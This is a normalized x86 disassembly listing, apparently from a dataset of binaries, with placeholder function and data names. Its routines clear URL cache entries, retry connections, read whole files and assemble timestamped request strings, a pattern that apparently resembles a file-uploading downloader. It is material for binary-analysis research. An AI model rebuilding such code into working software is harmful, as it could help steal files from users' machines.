jl r-xdata
mov ecx r--data
lea edx [ esp + 0x18 ]
or ebp 0xffffffff
call sub_100029c0
push 0x400
lea edx [ esp + 0x18 ]
lea edi [ esp + 0x11c ]
mov ecx esi
call sub_10007370
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call sub_100062a0
mov eax ebp
lea esp [ esp ]
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x11c ]
push eax
call sub_10007c00
add esp 0x8
test eax eax
je r-xdata
push 0x400
lea edx [ esp + 0x18 ]
lea edi [ esp + 0x11c ]
mov ecx esi
call sub_10007370
test eax eax
jne r-xdata
mov ebp 0x1
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
sub_10004da0
sub esp 0x424
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x420 ] eax
mov eax [ esp + 0x428 ]
push ebx
push ebp
mov ebp [ esp + 0x434 ]
push esi
push edi
xor edi edi
mov ebx ecx
push 0x401
lea ecx [ esp + 0x29 ]
push edi
push ecx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x28 ] eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x30 ] 0x0
call sub_1000ebe0
add esp 0xc
cmp ebx edi
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call [ DeleteUrlCacheEntry@IAT ]
mov ecx r--data
lea edx [ esp + 0x24 ]
call sub_100029c0
jmp r-xdata
mov ecx [ esp + 0x430 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x424
retn
mov eax [ ebx + 0x4 ]
push 0x4000100
push ebp
lea edx [ esp + 0x2c ]
push edx
push eax
call sub_10006320
mov esi eax
test esi esi
jne r-xdata
mov ecx esi
call sub_10006470
test eax eax
jne r-xdata
inc edi
jmp r-xdata
cmp edi 0x3
je r-xdata
call sub_100062a0
push 0x3e8
inc edi
call [ Sleep@IAT ]
cmp edi 0x3
jl r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea ebx [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x4
call sub_10007970
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0x5
jb r-xdata
call sub_100062a0
add eax 0x2
push eax
call sub_1000cef2
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov ebp [ esp + 0x10 ]
add ebp 0x2
push ebp
push 0x0
push ebx
mov [ esp + 0x24 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x3ff
lea edx [ esp + 0x18 ]
mov edi ebx
mov ecx esi
call sub_10007370
test eax eax
je r-xdata
call sub_100062a0
mov eax [ esp + 0x10 ]
cmp eax 0x94
jbe r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
add edx 0x351
lea ecx [ esp + 0x10 ]
call sub_10005410
mov eax [ esp + 0x10 ]
add [ esp + 0x18 ] eax
sub ebp eax
cmp ebp 0x2
jbe r-xdata
mov ecx [ esp + 0x1c ]
mov [ ecx ] eax
mov eax ebx
mov eax [ esp + 0x1c ]
push ebx
mov [ eax ] 0x0
call sub_1000c3e9
add esp 0x4
xor eax eax
jmp r-xdata
mov edx [ esp + 0x18 ]
lea edi [ ebx + edx ]
push 0x3ff
lea edx [ esp + 0x18 ]
mov ecx esi
call sub_10007370
test eax eax
jne r-xdata
sub_10004f60
push ecx
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push ebp
mov [ esp + 0x2c ] 0x0
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx eax
push ebx
call sub_1000cef2
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
or eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ebx
push edi
push esi
call [ ReadFile@IAT ]
push esi
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
lea eax [ edi - 0x2 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ebx
push edi
push ecx
mov ecx ebp
call sub_10005020
push edi
mov esi eax
call sub_1000c3e9
add esp 0x10
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
call [ CloseHandle@IAT ]
push edi
call sub_1000c3e9
add esp 0x4
mov eax 0xfffffffd
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10005020
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8b4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8b0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x401
mov edi edx
lea edx [ esp + 0x4b5 ]
push 0x0
push edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c ] ecx
mov [ esp + 0x4bc ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x7f
lea eax [ esp + 0x2d ]
push 0x0
push eax
mov [ esp + 0x34 ] 0x0
call sub_1000ebe0
add esp 0xc
test edi edi
je r-xdata
mov ecx [ esp + 0x8bc ]
pop edi
pop esi
pop ebx
xor ecx esp
or eax 0xffffffff
call sub_1000c176
mov esp ebp
pop ebp
retn
movzx eax [ edi + 0x348 ]
mov ecx [ ebp + 0x10 ]
lea edx [ edi + 0x349 ]
push edx
push eax
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] ecx
lea ecx [ edi + 0x5a9 ]
push esi
call sub_10005280
add esp 0x10
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x0
or ebx 0xffffffff
mov eax 0xfffffffe
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x8b0 ]
xor ecx esp
call sub_1000c176
mov esp ebp
pop ebp
retn
inc [ esp + 0x10 ]
cmp [ esp + 0x10 ] 0x3
jl r-xdata
mov ebx [ esp + 0x20 ]
test ebx ebx
je r-xdata
mov ecx r--data
lea edx [ esp + 0x28 ]
call sub_100029c0
call sub_1000ca3f
cdq
mov ecx 0x64
idiv ecx
lea eax [ edi + 0x8 ]
push edx
push eax
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x4bc ]
push eax
call [ wsprintfA@IAT ]
add esp 0x10
mov ecx r--data
lea edx [ esp + 0x28 ]
call sub_100029c0
mov eax [ edi + 0x4 ]
push 0x4400000
lea ecx [ esp + 0x4b4 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
push eax
call sub_10006320
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_1000c3e9
add esp 0x4
mov [ esp + 0x10 ] 0x0
test ebx ebx
jl r-xdata
push 0x0
mov eax ebx
lea edx [ eax + 0x1 ]
push 0x401
lea edx [ esp + 0xad ]
push 0x0
push edx
mov [ esp + 0xb4 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x400
lea edx [ esp + 0x18 ]
lea edi [ esp + 0xac ]
mov ecx esi
call sub_10007370
test eax eax
je r-xdata
call sub_100062a0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
call sub_100062a0
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x8b0 ]
xor ecx esp
call sub_1000c176
mov esp ebp
pop ebp
retn
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
push ebx
jmp r-xdata
lea eax [ esp + 0xa8 ]
push r--data
push eax
call sub_10007c00
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x20 ]
push eax
push esi
lea edx [ edi + 0x308 ]
lea ecx [ edi + 0x208 ]
call sub_100055e0
mov ebx eax
add esp 0x14
test ebx ebx
jge r-xdata
push 0x400
lea edx [ esp + 0x18 ]
lea edi [ esp + 0xac ]
mov ecx esi
call sub_10007370
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
sub_10005280
sub esp 0x40c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x408 ] eax
mov eax [ esp + 0x410 ]
push ebx
push ebp
mov ebp [ esp + 0x41c ]
push esi
push edi
push 0x3ff
mov esi ecx
xor ebx ebx
lea ecx [ esp + 0x1d ]
push ebx
push ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] 0x0
call sub_1000ebe0
mov al [ esp + 0x434 ]
add esp 0xc
mov [ esp + 0x14 ] ebx
cmp al 0x50
jne r-xdata
cmp al 0x58
jne r-xdata
push 0x6603
jmp r-xdata
mov edx [ ebp ]
inc edx
push edx
call sub_1000cef2
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x6610
call sub_1000bd30
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ esi ] 0x40
mov eax [ ebp ]
push eax
push ecx
lea edx [ esi + 0x1 ]
push edx
call sub_10013da0
add esp 0xc
inc [ ebp ]
mov [ ebp ] eax
jmp r-xdata
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x1c ]
push eax
push 0x94
push esi
push edi
call sub_1000bed0
mov ecx [ edi + 0x14 ]
mov edx [ ebp ]
lea eax [ ecx + edx + 0x195 ]
push eax
call sub_1000cef2
mov esi eax
add esp 0x18
test esi esi
je r-xdata
mov ecx [ esp + 0x418 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x40c
retn
push edi
call sub_1000be80
add esp 0x4
test ebx ebx
jne r-xdata
mov cl [ esp + 0x428 ]
mov eax [ esp + 0x42c ]
mov [ esi ] cl
mov edx [ eax ]
mov [ esi + 0x1 ] edx
mov eax [ eax + 0x4 ]
mov [ esi + 0x5 ] eax
mov ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea eax [ esi + 0x9 ]
push eax
call sub_10013da0
mov ecx [ edi + 0x14 ]
push ecx
lea edx [ edi + 0x4 ]
push edx
lea eax [ esi + 0x95 ]
push eax
call sub_10013da0
mov ecx [ ebp ]
mov edx [ esp + 0x28 ]
mov eax [ edi + 0x14 ]
push ecx
push edx
lea ecx [ eax + esi + 0x95 ]
push ecx
call sub_10013da0
mov edx [ edi + 0x14 ]
push ebp
lea eax [ edx + esi + 0x95 ]
push eax
push 0x1
push edi
call sub_1000bea0
mov ecx [ edi + 0x14 ]
add ecx 0x95
add esp 0x34
add [ ebp ] ecx
mov ebx 0x1
mov eax esi
sub_10005410
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xbc ] eax
push esi
push edi
push 0x8c
lea eax [ esp + 0x35 ]
mov edi ecx
push 0x0
push eax
mov [ esp + 0x1c ] edi
mov esi edx
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x3c ] 0x0
call sub_1000ebe0
xor eax eax
mov [ esp + 0x2d ] eax
mov [ esp + 0x31 ] eax
mov [ esp + 0x35 ] eax
mov [ esp + 0x39 ] ax
mov [ esp + 0x3b ] al
mov al [ ebx ]
add esp 0xc
mov [ esp + 0x20 ] 0x0
cmp al 0x50
jne r-xdata
cmp al 0x58
jne r-xdata
mov [ esp + 0x18 ] esi
mov [ esp + 0xc ] 0x8
mov eax 0x3
jmp r-xdata
cmp al 0x70
jne r-xdata
mov [ esp + 0xc ] 0x10
mov [ esp + 0x18 ] esi
mov eax 0x3
jmp r-xdata
mov ecx eax
dec eax
mov [ esp + 0x1c ] eax
test ecx ecx
je r-xdata
cmp al 0x40
jne r-xdata
mov [ esp + 0x18 ] rw-data
mov [ esp + 0xc ] 0x8
mov eax 0x3
jmp r-xdata
mov ecx [ esp + 0xc4 ]
mov [ edi ] 0x0
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_1000c176
mov esp ebp
pop ebp
retn
mov edx [ esp + 0xc ]
push edx
lea esi [ ebx + 0x1 ]
mov ecx 0x23
lea edi [ esp + 0x34 ]
lea eax [ ebx + 0x8d ]
[ edi ] [ esi ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
call sub_10013da0
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x2c ]
push edx
push 0x8c
lea eax [ esp + 0x44 ]
push eax
push 0x258
push ecx
call sub_1000b9c0
mov esi eax
add esp 0x20
test esi esi
je r-xdata
mov esi [ edi ]
dec esi
push esi
lea edx [ ebx + 0x1 ]
push edx
push ebx
call sub_10013da0
add esp 0xc
mov [ edi ] esi
mov eax 0x1
pop edi
pop esi
mov ecx [ esp + 0xbc ]
xor ecx esp
call sub_1000c176
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
mov eax [ edx ]
mov ecx [ esp + 0xc ]
sub eax ecx
sub eax 0x8d
mov edx eax
and edx 0x7
sub eax edx
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
lea edi [ ebx + ecx + 0x8d ]
push edi
push 0x1
push esi
call sub_1000bb40
push esi
call sub_1000bb20
mov esi [ esp + 0x28 ]
push esi
push edi
push ebx
call sub_10013da0
mov ecx [ esp + 0x30 ]
add esp 0x20
mov [ ecx ] esi
mov eax 0x1
pop edi
pop esi
mov ecx [ esp + 0xbc ]
xor ecx esp
call sub_1000c176
mov esp ebp
pop ebp
retn
sub_100055e0
mov eax 0x1868
call sub_1001a110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1864 ] eax
mov eax [ esp + 0x1874 ]
push ebx
push ebp
mov ebp [ esp + 0x1878 ]
push esi
push edi
mov edi [ esp + 0x187c ]
xor ebx ebx
push 0x7ff
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x1075 ]
push ebx
push eax
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x107c ] bl
call sub_1000ebe0
push 0xff
lea ecx [ esp + 0x781 ]
push ebx
push ecx
mov [ esp + 0x788 ] bl
call sub_1000ebe0
push 0x3ff
lea edx [ esp + 0xc8d ]
push ebx
push edx
mov [ esp + 0xc94 ] bl
call sub_1000ebe0
push 0x3ff
lea eax [ esp + 0x899 ]
push ebx
push eax
mov [ esp + 0x8a0 ] bl
call sub_1000ebe0
push 0x3ff
lea ecx [ esp + 0x3a5 ]
push ebx
push ecx
mov [ esp + 0x3ac ] bl
call sub_1000ebe0
push 0x7f
lea edx [ esp + 0x229 ]
push ebx
push edx
mov [ esp + 0x230 ] bl
call sub_1000ebe0
add esp 0x48
push 0x7f
lea eax [ esp + 0x16d ]
push ebx
push eax
mov [ esp + 0x174 ] bl
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0x71 ]
push ebx
push ecx
mov [ esp + 0x78 ] bl
call sub_1000ebe0
push 0x103
lea edx [ esp + 0x285 ]
push ebx
push edx
mov [ esp + 0x28c ] bl
call sub_1000ebe0
mov ecx r--data
lea edx [ esp + 0x1094 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x84 ]
call sub_100029c0
lea eax [ esp + 0x84 ]
push eax
lea ecx [ esp + 0x1098 ]
push ecx
push r--data
lea edx [ esp + 0x7a0 ]
push edx
call [ wsprintfA@IAT ]
add esp 0x34
lea ebx [ esp + 0x770 ]
call sub_10007610
test eax eax
jne r-xdata
mov cl [ r--data ]
mov ax [ r--data ]
mov [ esp + 0x16a ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
mov [ esp + 0x168 ] ax
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
or eax 0xffffffff
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x168 ]
sub eax edx
dec edi
mov ecx [ esp + 0x1874 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x1868
retn
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x168 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov dx [ r--data ]
mov cl [ r--data ]
mov [ eax ] dx
mov [ eax + 0x2 ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x168 ]
sub eax ecx
mov esi ecx
dec edi
lea ebx [ ebx ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x168 ]
dec edi
mov edi edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov dx [ r--data ]
mov [ edi ] dx
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x168 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x168 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov dx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
mov eax ebp
mov ecx ebp
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x168 ]
sub eax ecx
mov esi ecx
dec edi
lea esp [ esp ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov ax [ r--data ]
and ecx 0x3
[ edi ] [ esi ]
mov cl [ r--data ]
mov [ esp + 0xc72 ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
mov [ esp + 0xc70 ] ax
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0xc70 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0xc70 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov dx [ r--data ]
mov cl [ r--data ]
mov [ eax ] dx
mov [ eax + 0x2 ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0xc70 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xc70 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov dx [ r--data ]
mov [ edi ] dx
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0xc70 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0xc70 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov dx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
mov eax [ esp + 0x1c ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0xc70 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov ax [ r--data ]
and ecx 0x3
[ edi ] [ esi ]
mov cl [ r--data ]
mov [ esp + 0x872 ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
mov [ esp + 0x870 ] ax
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
lea ebx [ ebx ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x870 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x870 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov dx [ r--data ]
mov cl [ r--data ]
mov [ eax ] dx
mov [ eax + 0x2 ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x870 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x870 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov dx [ r--data ]
mov [ edi ] dx
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x870 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x870 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov dx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
mov eax [ esp + 0x20 ]
mov ecx eax
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x870 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x870 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cx [ r--data ]
mov dl [ r--data ]
mov [ eax ] cx
mov [ eax + 0x2 ] dl
mov eax [ esp + 0x188c ]
test eax eax
jne r-xdata
lea edx [ esp + 0x268 ]
sub edx eax
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x50 ]
push eax
call [ GetLocalTime@IAT ]
call [ GetTickCount@IAT ]
movzx edx [ esp + 0x5a ]
lea ecx [ esp + 0x60 ]
push ecx
movzx ecx [ esp + 0x5a ]
push eax
movzx eax [ esp + 0x60 ]
push edx
movzx edx [ esp + 0x5e ]
push eax
push ecx
push edx
lea eax [ esp + 0x280 ]
push r--data
push eax
call sub_1000c36c
add esp 0x20
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov ecx r--data
lea edx [ esp + 0x370 ]
call sub_100029c0
lea eax [ esp + 0x370 ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cx [ r--data ]
mov dl [ r--data ]
mov [ eax ] cx
mov [ eax + 0x2 ] dl
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x370 ]
sub eax ecx
mov esi ecx
dec edi
lea esp [ esp ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x370 ]
dec edi
mov edi edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ax [ r--data ]
mov ecx r--data
lea edx [ esp + 0x60 ]
mov [ edi ] ax
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x370 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x370 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx [ r--data ]
mov [ edi ] ecx
mov ecx r--data
lea edx [ esp + 0x60 ]
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x370 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x370 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov dx [ r--data ]
lea eax [ esp + 0x268 ]
mov [ edi ] dx
mov edx eax
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x370 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x370 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax [ r--data ]
mov ecx r--data
lea edx [ esp + 0x60 ]
mov [ edi ] eax
call sub_100029c0
lea eax [ esp + 0x60 ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x370 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x370 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov dl [ r--data ]
mov [ eax ] ecx
mov cl [ r--data ]
mov [ eax + 0x4 ] dl
mov ax [ r--data ]
mov [ esp + 0x1ea ] cl
mov ecx r--data
lea edx [ esp + 0x60 ]
mov [ esp + 0x1e8 ] ax
call sub_100029c0
lea eax [ esp + 0x60 ]
mov ecx eax
lea ecx [ ecx ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x1e8 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x1e8 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov cl [ r--data ]
mov [ eax ] edx
mov [ eax + 0x4 ] cl
lea eax [ esp + 0xc70 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x870 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebp eax
lea eax [ esp + 0x370 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
lea eax [ esp + 0x1e8 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
lea eax [ esp + 0x168 ]
mov [ esp + 0x20 ] esi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x18 ]
sub eax edx
mov edi eax
xor eax eax
lea edx [ edi + esi ]
add edx ebx
add edx ebp
add edx [ esp + 0x1c ]
mov [ esp + 0x2c ] eax
add edx [ esp + 0x1888 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x2c ] 0x28
mov [ esp + 0x48 ] edx
